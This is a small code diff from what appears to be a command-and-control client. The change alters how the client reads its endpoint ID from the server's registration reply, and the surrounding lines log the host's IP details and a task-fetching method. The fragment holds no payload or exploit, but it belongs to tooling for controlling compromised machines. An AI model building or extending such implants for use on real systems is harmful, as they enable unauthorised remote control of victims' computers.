@@ -138,7 +138,7 @@ class C2Client:
         logger.debug(f"request info addr looks like this: {request['info']}")
         logger.debug(f"request ip addr looks like this: {request['info']['ip']}")
         logger.debug(f"type: {type(request['info']['ip'])}")
-        self.endpoint_id = self.c2_server_transaction(server_message=request)
+        self.endpoint_id = self.c2_server_transaction(server_message=request)["response"]["endpoint_id"]
         logger.info(f"registered as {self.endpoint_id}")
 
     def get_tasks(self) -> list:
